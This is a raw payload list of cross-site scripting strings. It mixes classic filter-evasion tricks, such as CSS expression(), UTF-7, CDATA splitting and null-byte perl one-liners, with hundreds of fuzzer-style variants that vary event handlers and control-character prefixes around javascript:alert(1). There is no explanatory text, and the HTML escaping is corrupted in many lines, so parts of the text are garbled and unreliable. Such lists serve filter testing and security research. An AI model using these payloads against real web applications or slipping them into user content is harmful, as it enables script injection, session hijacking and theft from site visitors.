a=";get";;&;#10;b=";URL(";";;&;#10;c=";javascript:";;&;#10;d=";alert(';XSS';);";)";;&#10;eval(a+b+c+d);

&lt;;STYLE TYPE=";text/javascript";&gt;;alert(';XSS';);&lt;;/STYLE&gt;;

&lt;;IMG STYLE=";xss:expr/*XSS*/ession(alert(';XSS';))";&gt;;

&lt;;XSS STYLE=";xss:expression(alert(';XSS';))";&gt;;

&lt;;STYLE&gt;;.XSS{background-image:url(";javascript:alert(';XSS';)";);}&lt;;/STYLE&gt;;&lt;;A CLASS=XSS&gt;;&lt;;/A&gt;;

&lt;;STYLE type=";text/css";&gt;;BODY{background:url(";javascript:alert(';XSS';)";)}&lt;;/STYLE&gt;;

&lt;;LINK REL=";stylesheet"; HREF=";javascript:alert(';XSS';);";&gt;;

&lt;;TABLE BACKGROUND=";javascript:alert(';XSS';)";&gt;;&lt;;/TABLE&gt;;

&lt;;TABLE&gt;;&lt;;TD BACKGROUND=";javascript:alert(';XSS';)";&gt;;&lt;;/TD&gt;;&lt;;/TABLE&gt;;

&lt;;XML ID=I&gt;;&lt;;X&gt;;&lt;;C&gt;;&lt;;![CDATA[&lt;;IMG SRC=";javas]]&gt;;&lt;;![CDATA[cript:alert(';XSS';);";&gt;;]]&gt;;

&lt;;XML ID=";xss";&gt;;&lt;;I&gt;;&lt;;B&gt;;&lt;;IMG SRC=";javas&lt;;!-- --&gt;;cript:alert(';XSS';)";&gt;;&lt;;/B&gt;;&lt;;/I&gt;;&lt;;/XML&gt;;

&lt;;META HTTP-EQUIV=";Set-Cookie"; Content=";USERID=&lt;;SCRIPT&gt;;alert(';XSS';)&lt;;/SCRIPT&gt;;";&gt;;



&lt;;BR SIZE=";&;{alert(';XSS';)}";&gt;;

&lt;;IMG SRC=JaVaScRiPt:alert(';XSS';)&gt;;

&lt;;IMG SRC=javascript:alert(&;quot;XSS&;quot;)&gt;;

&lt;;IMG SRC=`javascript:alert(";RSnake says, ';XSS';";)`&gt;;

&lt;;HEAD&gt;;&lt;;META HTTP-EQUIV=";CONTENT-TYPE"; CONTENT=";text/html; charset=UTF-7";&gt;; &lt;;/HEAD&gt;;+ADw-SCRIPT+AD4-alert(';XSS';);+ADw-/SCRIPT+AD4-

\";;alert(';XSS';);//

&lt;;/TITLE&gt;;&lt;;SCRIPT&gt;;alert("XSS");&lt;;/SCRIPT&gt;;

&lt;;STYLE&gt;;@im\port';\ja\vasc\ript:alert(";XSS";)';;&lt;;/STYLE&gt;;

&lt;;IMG SRC=";jav&#x09;ascript:alert(';XSS';);";&gt;;

&lt;;IMG SRC=";jav&;#x09;ascript:alert(';XSS';);";&gt;;

&lt;;IMG SRC=";jav&;#x0A;ascript:alert(';XSS';);";&gt;;

&lt;;IMG SRC=";jav&;#x0D;ascript:alert(';XSS';);";&gt;;

perl -e ';print ";&lt;;IM SRC=java\0script:alert(";XSS";)&gt;";;';&gt;; out

perl -e ';print ";&;&lt;;SCR\0IPT&gt;;alert(";XSS";)&lt;;/SCR\0IPT&gt;;";;'; &gt;; out

&lt;;IMG SRC="; &;#14;  javascript:alert(';XSS';);";&gt;;




&lt;;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)&gt;;

&lt;;IMG SRC=";javascript:alert(';XSS';)";

&lt;;&lt;;SCRIPT&gt;;alert(";XSS";);//&lt;;&lt;;/SCRIPT&gt;;

&lt;;IMG ";";";&gt;;&lt;;SCRIPT&gt;;alert(";XSS";)&lt;;/SCRIPT&gt;;";&gt;;



";&gt;;&lt;;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)&gt;;

&lt;;br size=\";&;{alert(&#039;XSS&#039;)}\";&gt;;

perl -e &#039;print \";&lt;;IMG SRC=java\0script:alert(\";XSS\";)&gt;;\";;&#039; &gt;; out

perl -e &#039;print \";&lt;;SCR\0IPT&gt;;alert(\";XSS\";)&lt;;/SCR\0IPT&gt;;\";;&#039; &gt;; out

&gt;"&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;&

"&gt;&lt;STYLE&gt;@import"javascript:alert('XSS')";&lt;/STYLE&gt;

&gt;"'&gt;&lt;img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)&gt;

'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'

&lt;IMG SRC=JaVaScRiPt:alert(&quot;XSS&lt;WBR&gt;&quot;)&gt;

&lt;IMG SRC="jav&#x0A;ascript:alert(&lt;WBR&gt;'XSS');"&gt;

&lt;IMG SRC="jav&#x0D;ascript:alert(&lt;WBR&gt;'XSS');"&gt;

&lt;script&gt;alert('XSS')&lt;/script&gt;

%3cscript%3ealert('XSS')%3c/script%3e

%22%3e%3cscript%3ealert('XSS')%3c/script%3e

&lt;script\x3Etype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;

&lt;script\x0Dtype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;

&lt;script\x09type="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;

&lt;script\x0Ctype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;

&lt;script\x2Ftype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;

&lt;script\x0Atype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;

'`"&gt;&lt;\x3Cscript&gt;javascript:alert(1)&lt;/script&gt;

'`"&gt;&lt;\x00script&gt;javascript:alert(1)&lt;/script&gt;

&lt;img src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/img&gt;

&lt;audio src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/audio&gt;

&lt;video src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/video&gt;

&lt;body src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/body&gt;

&lt;image src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/image&gt;

&lt;object src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/object&gt;

&lt;script src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/script&gt;

&lt;svg onResize svg onResize="javascript:javascript:alert(1)"&gt;&lt;/svg onResize&gt;

&lt;title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"&gt;&lt;/title onPropertyChange&gt;

&lt;iframe onLoad iframe onLoad="javascript:javascript:alert(1)"&gt;&lt;/iframe onLoad&gt;

&lt;body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"&gt;&lt;/body onMouseEnter&gt;

&lt;body onFocus body onFocus="javascript:javascript:alert(1)"&gt;&lt;/body onFocus&gt;

&lt;frameset onScroll frameset onScroll="javascript:javascript:alert(1)"&gt;&lt;/frameset onScroll&gt;

&lt;script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"&gt;&lt;/script onReadyStateChange&gt;

&lt;html onMouseUp html onMouseUp="javascript:javascript:alert(1)"&gt;&lt;/html onMouseUp&gt;

&lt;body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"&gt;&lt;/body onPropertyChange&gt;

&lt;svg onLoad svg onLoad="javascript:javascript:alert(1)"&gt;&lt;/svg onLoad&gt;

&lt;body onPageHide body onPageHide="javascript:javascript:alert(1)"&gt;&lt;/body onPageHide&gt;

&lt;body onMouseOver body onMouseOver="javascript:javascript:alert(1)"&gt;&lt;/body onMouseOver&gt;

&lt;body onUnload body onUnload="javascript:javascript:alert(1)"&gt;&lt;/body onUnload&gt;

&lt;body onLoad body onLoad="javascript:javascript:alert(1)"&gt;&lt;/body onLoad&gt;

&lt;bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"&gt;&lt;/bgsound onPropertyChange&gt;

&lt;html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"&gt;&lt;/html onMouseLeave&gt;

&lt;html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"&gt;&lt;/html onMouseWheel&gt;

&lt;style onLoad style onLoad="javascript:javascript:alert(1)"&gt;&lt;/style onLoad&gt;

&lt;iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"&gt;&lt;/iframe onReadyStateChange&gt;

&lt;body onPageShow body onPageShow="javascript:javascript:alert(1)"&gt;&lt;/body onPageShow&gt;

&lt;style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"&gt;&lt;/style onReadyStateChange&gt;

&lt;frameset onFocus frameset onFocus="javascript:javascript:alert(1)"&gt;&lt;/frameset onFocus&gt;

&lt;applet onError applet onError="javascript:javascript:alert(1)"&gt;&lt;/applet onError&gt;

&lt;marquee onStart marquee onStart="javascript:javascript:alert(1)"&gt;&lt;/marquee onStart&gt;

&lt;script onLoad script onLoad="javascript:javascript:alert(1)"&gt;&lt;/script onLoad&gt;

&lt;html onMouseOver html onMouseOver="javascript:javascript:alert(1)"&gt;&lt;/html onMouseOver&gt;

&lt;html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"&gt;&lt;/html onMouseEnter&gt;

&lt;body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"&gt;&lt;/body onBeforeUnload&gt;

&lt;html onMouseDown html onMouseDown="javascript:javascript:alert(1)"&gt;&lt;/html onMouseDown&gt;

&lt;marquee onScroll marquee onScroll="javascript:javascript:alert(1)"&gt;&lt;/marquee onScroll&gt;

&lt;xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"&gt;&lt;/xml onPropertyChange&gt;

&lt;frameset onBlur frameset onBlur="javascript:javascript:alert(1)"&gt;&lt;/frameset onBlur&gt;

&lt;applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"&gt;&lt;/applet onReadyStateChange&gt;

&lt;svg onUnload svg onUnload="javascript:javascript:alert(1)"&gt;&lt;/svg onUnload&gt;

&lt;html onMouseOut html onMouseOut="javascript:javascript:alert(1)"&gt;&lt;/html onMouseOut&gt;

&lt;body onMouseMove body onMouseMove="javascript:javascript:alert(1)"&gt;&lt;/body onMouseMove&gt;

&lt;body onResize body onResize="javascript:javascript:alert(1)"&gt;&lt;/body onResize&gt;

&lt;object onError object onError="javascript:javascript:alert(1)"&gt;&lt;/object onError&gt;

&lt;body onPopState body onPopState="javascript:javascript:alert(1)"&gt;&lt;/body onPopState&gt;

&lt;html onMouseMove html onMouseMove="javascript:javascript:alert(1)"&gt;&lt;/html onMouseMove&gt;

&lt;applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"&gt;&lt;/applet onreadystatechange&gt;

&lt;body onpagehide body onpagehide="javascript:javascript:alert(1)"&gt;&lt;/body onpagehide&gt;

&lt;svg onunload svg onunload="javascript:javascript:alert(1)"&gt;&lt;/svg onunload&gt;

&lt;applet onerror applet onerror="javascript:javascript:alert(1)"&gt;&lt;/applet onerror&gt;

&lt;body onkeyup body onkeyup="javascript:javascript:alert(1)"&gt;&lt;/body onkeyup&gt;

&lt;body onunload body onunload="javascript:javascript:alert(1)"&gt;&lt;/body onunload&gt;

&lt;iframe onload iframe onload="javascript:javascript:alert(1)"&gt;&lt;/iframe onload&gt;

&lt;body onload body onload="javascript:javascript:alert(1)"&gt;&lt;/body onload&gt;

&lt;html onmouseover html onmouseover="javascript:javascript:alert(1)"&gt;&lt;/html onmouseover&gt;

&lt;object onbeforeload object onbeforeload="javascript:javascript:alert(1)"&gt;&lt;/object onbeforeload&gt;

&lt;body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"&gt;&lt;/body onbeforeunload&gt;

&lt;body onfocus body onfocus="javascript:javascript:alert(1)"&gt;&lt;/body onfocus&gt;

&lt;body onkeydown body onkeydown="javascript:javascript:alert(1)"&gt;&lt;/body onkeydown&gt;

&lt;iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"&gt;&lt;/iframe onbeforeload&gt;

&lt;iframe src iframe src="javascript:javascript:alert(1)"&gt;&lt;/iframe src&gt;

&lt;svg onload svg onload="javascript:javascript:alert(1)"&gt;&lt;/svg onload&gt;

&lt;html onmousemove html onmousemove="javascript:javascript:alert(1)"&gt;&lt;/html onmousemove&gt;

&lt;body onblur body onblur="javascript:javascript:alert(1)"&gt;&lt;/body onblur&gt;

\x3Cscript&gt;javascript:alert(1)&lt;/script&gt;

'"`&gt;&lt;script&gt;/* *\x2Fjavascript:alert(1)// */&lt;/script&gt;

&lt;script&gt;javascript:alert(1)&lt;/script\x0D

&lt;script&gt;javascript:alert(1)&lt;/script\x0A

&lt;script&gt;javascript:alert(1)&lt;/script\x0B

&lt;script charset="\x22&gt;javascript:alert(1)&lt;/script&gt;

&lt;!--\x3E&lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;

--&gt;&lt;!-- ---&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;

--&gt;&lt;!-- --\x00&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;

--&gt;&lt;!-- --\x21&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;

--&gt;&lt;!-- --\x3E&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;

`"'&gt;&lt;img src='#\x27 onerror=javascript:alert(1)&gt;

&lt;a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

"'`&gt;&lt;p&gt;&lt;svg&gt;&lt;script&gt;a='hello\x27;javascript:alert(1)//';&lt;/script&gt;&lt;/p&gt;

&lt;a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="javas\x07cript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;


&lt;a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="javas\x08cript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="javas\x03cript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;


&lt;a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="javas\x0Bcript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="javas\x09cript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="javas\x06cript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="javas\x0Ccript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;script&gt;/* *\x2A/javascript:alert(1)// */&lt;/script&gt;

&lt;script&gt;/* *\x00/javascript:alert(1)// */&lt;/script&gt;

&lt;style&gt;&lt;/style\x3E&lt;img src="about:blank" onerror=javascript:alert(1)//&gt;&lt;/style&gt;

&lt;style&gt;&lt;/style\x0D&lt;img src="about:blank" onerror=javascript:alert(1)//&gt;&lt;/style&gt;

&lt;style&gt;&lt;/style\x09&lt;img src="about:blank" onerror=javascript:alert(1)//&gt;&lt;/style&gt;

&lt;style&gt;&lt;/style\x20&lt;img src="about:blank" onerror=javascript:alert(1)//&gt;&lt;/style&gt;

&lt;style&gt;&lt;/style\x0A&lt;img src="about:blank" onerror=javascript:alert(1)//&gt;&lt;/style&gt;

"'`&gt;ABC&lt;div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"&gt;DEF

"'`&gt;ABC&lt;div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"&gt;DEF

&lt;script&gt;if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}&lt;/script&gt;

&lt;script&gt;if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}&lt;/script&gt;

&lt;script&gt;if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}&lt;/script&gt;

"'`&gt;&lt;\x3Cimg src=xxx:x onerror=javascript:alert(1)&gt;

"'`&gt;&lt;\x00img src=xxx:x onerror=javascript:alert(1)&gt;

&lt;script src="data:text/plain\x2Cjavascript:alert(1)"&gt;&lt;/script&gt;

&lt;script src="data:\xD4\x8F,javascript:alert(1)"&gt;&lt;/script&gt;

&lt;script src="data:\xE0\xA4\x98,javascript:alert(1)"&gt;&lt;/script&gt;

&lt;script src="data:\xCB\x8F,javascript:alert(1)"&gt;&lt;/script&gt;

&lt;script\x20type="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;

ABC&lt;div style="x\x3Aexpression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:expression\x5C(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:expression\x00(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:exp\x00ression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:exp\x5Cression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:\x0Aexpression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:\x09expression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:\xE3\x80\x80expression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:\xE2\x80\x84expression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:\xC2\xA0expression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:\xE2\x80\x80expression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:\xE2\x80\x8Aexpression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:\x0Dexpression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:\x0Cexpression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:\xE2\x80\x87expression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:\x20expression(javascript:alert(1)"&gt;DEF
ABC&lt;div style="x:\xE2\x80\x88expression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:\x00expression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:\xE2\x80\x8Bexpression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:\xE2\x80\x86expression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:\xE2\x80\x85expression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:\xE2\x80\x82expression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:\x0Bexpression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:\xE2\x80\x81expression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:\xE2\x80\x83expression(javascript:alert(1)"&gt;DEF

ABC&lt;div style="x:\xE2\x80\x89expression(javascript:alert(1)"&gt;DEF

&lt;a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x05javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x18javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x11javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x17javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x03javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x00javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x10javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x20javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x13javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;


&lt;a href="\x09javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x14javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x19javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x07javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x04javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x01javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x08javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x12javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x15javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x16javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x02javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x06javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="javascript\x00:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="javascript\x09:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

&lt;a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;

`"'&gt;&lt;img src=xxx:x \x0Aonerror=javascript:alert(1)&gt;

`"'&gt;&lt;img src=xxx:x \x22onerror=javascript:alert(1)&gt;

`"'&gt;&lt;img src=xxx:x \x0Bonerror=javascript:alert(1)&gt;

`"'&gt;&lt;img src=xxx:x \x0Donerror=javascript:alert(1)&gt;

`"'&gt;&lt;img src=xxx:x \x2Fonerror=javascript:alert(1)&gt;

`"'&gt;&lt;img src=xxx:x \x09onerror=javascript:alert(1)&gt;

`"'&gt;&lt;img src=xxx:x \x0Conerror=javascript:alert(1)&gt;

`"'&gt;&lt;img src=xxx:x \x00onerror=javascript:alert(1)&gt;

`"'&gt;&lt;img src=xxx:x \x27onerror=javascript:alert(1)&gt;

`"'&gt;&lt;img src=xxx:x \x20onerror=javascript:alert(1)&gt;

"`'&gt;&lt;script&gt;\x3Bjavascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\x0Djavascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xEF\xBB\xBFjavascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xE2\x80\x81javascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xE2\x80\x84javascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xE3\x80\x80javascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\x09javascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xE2\x80\x89javascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xE2\x80\x85javascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xE2\x80\x88javascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\x00javascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xE2\x80\xA8javascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xE2\x80\x8Ajavascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xE1\x9A\x80javascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\x0Cjavascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\x2Bjavascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xF0\x90\x96\x9Ajavascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;-javascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\x0Ajavascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xE2\x80\xAFjavascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\x7Ejavascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xE2\x80\x87javascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xE2\x81\x9Fjavascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xE2\x80\xA9javascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xC2\x85javascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xEF\xBF\xAEjavascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xE2\x80\x83javascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xE2\x80\x8Bjavascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xEF\xBF\xBEjavascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xE2\x80\x80javascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\x21javascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xE2\x80\x82javascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xE2\x80\x86javascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xE1\xA0\x8Ejavascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\x0Bjavascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\x20javascript:alert(1)&lt;/script&gt;

"`'&gt;&lt;script&gt;\xC2\xA0javascript:alert(1)&lt;/script&gt;

"/&gt;&lt;img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x /&gt;

"/&gt;&lt;img/onerror=\x22javascript:alert(1)\x22src=xxx:x /&gt;

"/&gt;&lt;img/onerror=\x09javascript:alert(1)\x09src=xxx:x /&gt;

"/&gt;&lt;img/onerror=\x27javascript:alert(1)\x27src=xxx:x /&gt;

"/&gt;&lt;img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x /&gt;

"/&gt;&lt;img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x /&gt;

"/&gt;&lt;img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x /&gt;

